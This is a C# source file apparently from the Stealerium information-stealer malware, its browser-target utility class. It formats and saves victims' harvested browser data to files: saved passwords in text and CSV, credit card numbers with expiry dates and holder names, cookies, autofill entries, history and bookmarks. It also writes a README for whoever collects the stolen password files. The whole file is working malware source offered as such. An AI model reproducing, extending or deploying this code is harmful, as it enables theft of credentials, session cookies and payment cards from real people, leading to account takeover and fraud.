using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers
{
    /// <summary>
    /// Utility class for formatting and writing browser-related data such as passwords, cookies, history, etc.
    /// </summary>
    internal sealed class CBrowserUtils
    {
        /// <summary>
        /// Formats password data into a readable text format.
        /// </summary>
        /// <param name="pPassword">Password object containing URL, Username, and Password.</param>
        /// <returns>A formatted string for password data in text format.</returns>
        private static string FormatPassword(Password pPassword)
        {
            return $"Hostname: {pPassword.Url}\nUsername: {pPassword.Username}\nPassword: {pPassword.Pass}\n\n";
        }

        /// <summary>
        /// Formats password data into a CSV format.
        /// </summary>
        /// <param name="pPassword">Password object containing URL, Username, and Password.</param>
        /// <returns>A formatted string in CSV format for password data.</returns>
        private static string FormatPasswordCsv(Password pPassword)
        {
            return $"{pPassword.Url},{pPassword.Username},{pPassword.Pass}";
        }

        /// <summary>
        /// Formats credit card data into a readable string.
        /// </summary>
        /// <param name="cCard">Credit card object containing number, expiry, and holder information.</param>
        /// <returns>A formatted string for the credit card data.</returns>
        private static string FormatCreditCard(CreditCard cCard)
        {
            return
                $"Type: {Banking.DetectCreditCardType(cCard.Number)}\nNumber: {cCard.Number}\nExp: {cCard.ExpMonth}/{cCard.ExpYear}\nHolder: {cCard.Name}\n\n";
        }

        /// <summary>
        /// Formats cookie data into a readable format.
        /// </summary>
        /// <param name="cCookie">Cookie object.</param>
        /// <returns>A formatted string for cookie data.</returns>
        private static string FormatCookie(Cookie cCookie)
        {
            return
                $"Host: {cCookie.HostKey}\n" +
                $"Path: {cCookie.Path}\n" +
                $"Expires: {cCookie.ExpiresUtc}\n" +
                $"Name: {cCookie.Name}\n" +
                $"Value: {cCookie.Value}\n\n";
        }

        /// <summary>
        /// Formats autofill data into a readable string.
        /// </summary>
        /// <param name="aFill">AutoFill object.</param>
        /// <returns>A formatted string for autofill data.</returns>
        private static string FormatAutoFill(AutoFill aFill)
        {
            return $"{aFill.Name}\t{aFill.Name}\t\n\n";
        }

        /// <summary>
        /// Formats history entry data into a readable string.
        /// Removes duplicates based on URL.
        /// </summary>
        /// <param name="historyEntries">List of history entries (Site objects).</param>
        /// <returns>A formatted string for the site history data without duplicates.</returns>
        public static string FormatHistory(List<Site> historyEntries)
        {
            var uniqueUrls = new HashSet<string>(); // To track unique URLs
            var formattedHistoryList = new List<string>(); // To store each formatted entry

            foreach (var sSite in historyEntries)
            {
                // If the URL is already added, skip it
                if (uniqueUrls.Contains(sSite.Url))
                    continue;

                // Add the URL to the HashSet to mark it as processed
                uniqueUrls.Add(sSite.Url);

                // Format the history entry and add it to the list
                formattedHistoryList.Add($"URL: {sSite.Url}");
                formattedHistoryList.Add($"Title: {sSite.Title}");
                formattedHistoryList.Add(""); // Newline between entries
            }

            // Join the list entries with newlines to create the final formatted string
            return string.Join("\n", formattedHistoryList);
        }


        /// <summary>
        /// Formats bookmark data into a readable string.
        /// </summary>
        /// <param name="bBookmark">Bookmark object.</param>
        /// <returns>A formatted string for the bookmark data.</returns>
        private static string FormatBookmark(Bookmark bBookmark)
        {
            if (!string.IsNullOrEmpty(bBookmark.Url))
            {
                return $"Title: {bBookmark.Title}\n" +
                       $"URL: {bBookmark.Url}\n\n";
            }
            else
            {
                return $"Title: {bBookmark.Title}\n" +
                       $"URL: (No URL provided)\n\n";
            }
        }

        /// <summary>
        /// Writes cookie data to a file.
        /// </summary>
        /// <param name="cCookies">List of cookies to write.</param>
        /// <param name="sFile">File path to save the data.</param>
        public static void WriteCookies(List<Cookie> cCookies, string sFile)
        {
            try
            {
                foreach (var cCookie in cCookies)
                    File.AppendAllText(sFile, FormatCookie(cCookie));
            }
            catch
            {
                // Handle or log exception if needed
            }
        }

        /// <summary>
        /// Writes autofill data to a file.
        /// </summary>
        /// <param name="aFills">List of autofills to write.</param>
        /// <param name="sFile">File path to save the data.</param>
        public static void WriteAutoFill(List<AutoFill> aFills, string sFile)
        {
            try
            {
                foreach (var aFill in aFills)
                    File.AppendAllText(sFile, FormatAutoFill(aFill));
            }
            catch
            {
                // Handle or log exception if needed
            }
        }

        /// <summary>
        /// Writes browsing history to a file.
        /// </summary>
        /// <param name="sHistory">List of history entries.</param>
        /// <param name="sFile">File path to save the data.</param>
        public static void WriteHistory(List<Site> sHistory, string sFile)
        {
            try
            {
                // Format the entire history and remove duplicates
                var formattedHistory = FormatHistory(sHistory);

                // Write the formatted result to the file
                File.WriteAllText(sFile, formattedHistory);
            }
            catch (Exception ex)
            {
                // Handle or log exception if needed
                Logging.Log("Error writing history: " + ex.Message);
            }
        }

        /// <summary>
        /// Writes bookmarks to a file.
        /// </summary>
        /// <param name="bBookmarks">List of bookmarks to write.</param>
        /// <param name="sFile">File path to save the data.</param>
        public static void WriteBookmarks(List<Bookmark> bBookmarks, string sFile)
        {
            try
            {
                foreach (var bBookmark in bBookmarks)
                    File.AppendAllText(sFile, FormatBookmark(bBookmark));
            }
            catch
            {
                // Handle or log exception if needed
            }
        }

        /// <summary>
        /// Writes password data to a text file.
        /// </summary>
        /// <param name="pPasswords">List of passwords to write.</param>
        /// <param name="sFile">File path to save the text data.</param>
        public static void WritePasswordsToTxt(List<Password> pPasswords, string sFile)
        {
            try
            {
                foreach (var pPassword in pPasswords)
                {
                    // Skip entries with empty usernames or passwords
                    if (string.IsNullOrEmpty(pPassword.Username) || string.IsNullOrEmpty(pPassword.Pass))
                        continue;

                    // Write password entry in text format
                    File.AppendAllText(sFile, FormatPassword(pPassword));
                }
            }
            catch
            {
                // Handle or log exception if needed
            }
        }

        /// <summary>
        /// Writes password data to a CSV file.
        /// </summary>
        /// <param name="pPasswords">List of passwords to write.</param>
        /// <param name="sFile">File path to save the CSV data.</param>
        public static void WritePasswordsToCsv(List<Password> pPasswords, string sFile)
        {
            try
            {
                // Open the CSV file for writing
                using (var writer = new StreamWriter(sFile))
                {
                    // Write CSV headers
                    writer.WriteLine("Hostname,Username,Password");

                    // Loop through each password entry and write it in CSV format
                    foreach (var pPassword in pPasswords)
                    {
                        // Skip entries with empty usernames or passwords
                        if (string.IsNullOrEmpty(pPassword.Username) || string.IsNullOrEmpty(pPassword.Pass))
                            continue;

                        // Write password entry in CSV format
                        writer.WriteLine(FormatPasswordCsv(pPassword));
                    }
                }
            }
            catch
            {
                // Handle or log exception if needed
            }
        }

        /// <summary>
        /// Creates a README.txt file explaining the format options (TXT and CSV).
        /// </summary>
        /// <param name="directoryPath">Directory where the README file will be created.</param>
        public static void CreateReadme(string directoryPath)
        {
            var readmeContent = @"
---------------------------------------
   Passwords in txt and csv format?
---------------------------------------
Both formats contain the same data, but the structure is different. You can choose to use the one that best suits your needs:

1. **passwords.txt**
   - This file contains the passwords in a plain text format, with each password listed in a more human-readable style.
   - Recommended if you prefer to quickly view the data without needing any special tools.

   Format:
   Hostname: example.com
   Username: user@example.com
   Password: your_password

2. **passwords.csv**
   - This file is structured in a **CSV (Comma Separated Values)** format.
   - Recommended if you want to import the data into spreadsheet software like Microsoft Excel, Google Sheets, or any other CSV-supporting tool.
   - Each row represents a password entry with columns for Hostname, Username, and Password.

   Format:
   Hostname,Username,Password
   example.com,user@example.com,your_password

---------------------------------------
            WHICH ONE TO USE?
---------------------------------------

- Use **passwords.txt** if:
  - You just want a quick, easy-to-read list of passwords.
  - You are not planning to import the data into other software.

- Use **passwords.csv** if:
  - You want to import the data into Excel or any CSV-compatible software.
  - You prefer a structured format for programmatic use or data analysis.

---------------------------------------
       HOW TO OPEN THESE FILES?
---------------------------------------

- **passwords.txt**:
  - You can open this file with any text editor like Notepad (Windows), TextEdit (Mac), or any code editor like Visual Studio Code or Sublime Text.

- **passwords.csv**:
  - This file can be opened with spreadsheet software like Microsoft Excel, Google Sheets, or any tool that supports CSV files.
---------------------------------------
";

            File.WriteAllText(Path.Combine(directoryPath, "README.txt"), readmeContent);
        }

        /// <summary>
        /// Writes credit card data to a file.
        /// </summary>
        /// <param name="cCc">List of credit cards to write.</param>
        /// <param name="sFile">File path to save the data.</param>
        public static void WriteCreditCards(List<CreditCard> cCc, string sFile)
        {
            try
            {
                foreach (var aCc in cCc)
                    File.AppendAllText(sFile, FormatCreditCard(aCc));
            }
            catch
            {
                // Handle or log exception if needed
            }
        }
    }
}
